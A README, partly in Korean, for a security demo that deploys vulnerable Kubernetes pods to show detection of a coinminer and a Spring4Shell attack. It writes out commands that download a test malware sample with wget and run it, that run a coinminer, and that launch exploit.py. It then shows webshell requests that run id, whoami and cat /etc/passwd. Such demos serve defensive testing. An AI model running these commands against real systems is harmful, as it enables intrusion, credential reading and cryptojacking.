# Spring4Shell and Coinminer PoC
## This is for testing and demo purposes

#### STEP 0. EKS와 같은 K8S 클러스터, 클러스터에 접속가능한 VM 준비
#### STEP 1. Git 설치후 본 Repo 를 clone 혹은 .zip으로 다운로드 
#### STEP 2. Dockerfile을 docker build . -t spring4shell 로 빌드하여 Registry에 올리거나, 로컬 경로 메모

![WebPage](screenshots/dockerfilebuild.png?raw=true)

#### STEP 3. kubectl apply -f xdr_for_cloud_demo.yaml 의 이미지 경로 확인 및 수정(주석 참조)
#### STEP 4. kubectl get all 로 pod 및 service 확인

아래 YAML file에 kubectl apply:
```sh
$ kubectl apply -f xdr_for_cloud_demo.yaml
pod/jie-spring4shell-pod created
pod/vulmachine-pod created
service/jie-sprig4shell created
```

2개의 pod와 1개의 서비스가 성공적으로 생성되었다면 아래 커맨드를 통해 STATUS를 점검합니다.
```sh
$ kubectl get all
```
![WebPage](screenshots/getAll.png?raw=true)

Coinminer pod 및 Spring4Shell pod - 취약한 pod 가 2개 생성됩니다.

## STEP 5. Use cases

### Coinminer 공격
#### Get the malware sample from Wildfire and execute it
```sh
$ kubectl exec -it vulmachine-pod  -- /bin/bash
root@vulmachine-pod:/# wget http://wildfire.paloaltonetworks.com/publicapi/test/elf -O /tmp/sample
--2023-04-24 03:19:40--  http://wildfire.paloaltonetworks.com/publicapi/test/elf
Resolving wildfire.paloaltonetworks.com (wildfire.paloaltonetworks.com)... 35.247.145.234
Connecting to wildfire.paloaltonetworks.com (wildfire.paloaltonetworks.com)|35.247.145.234|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8608 (8.4K) [application/octet-stream]
Saving to: '/tmp/sample'

/tmp/sample                                100%[======================================================================================>]   8.41K  --.-KB/s    in 0s      

2023-04-24 03:19:40 (56.4 MB/s) - '/tmp/sample' saved [8608/8608]

root@vulmachine-pod:/# chmod +x /tmp/sample 
root@vulmachine-pod:/# ./tmp/sample
```

#### Execute the coinminer
```sh
$ kubectl exec -it vulmachine-pod  -- /bin/bash
root@vulmachine-pod:/# ./tmp/coinminer
```

![WebPage](screenshots/Coinminer.png?raw=true)


### Exploit the Spring4Shell service
`kubectl get all` 명령의 출력을 확인하여 배포된 서비스의 EXTERNAL-IP를 찾고, 해당 IP 주소를 웹 브라우저에 입력하여 접속합니다.

![WebPage](screenshots/checkService.png?raw=true)

위 화면을 확인하였으면 exploit.py 로 공격을 실행합니다.
```sh
$ python3 exploit.py --url "http://"your service external ip":8080/helloworld/greeting"
```
![WebPage](screenshots/exploitpy.png?raw=true)

위 과정이 완료되면 webshell이 서버에 업로드되며, 아래 명령어를 사용하여 id 또는 /etc/password 파일을 확인할 수 있습니다.
```sh
$ http://"your service external ip":8080/webshell.jsp?cmd=id
$ http://"your service external ip":8080/webshell.jsp?cmd=cat%20/etc/passwd
$ http://"your service external ip":8080/webshell.jsp?cmd=whoami
```

## Credit
[@reznok](https://github.com/reznok/Spring4Shell-POC) for helping on building a spring4shell container image.
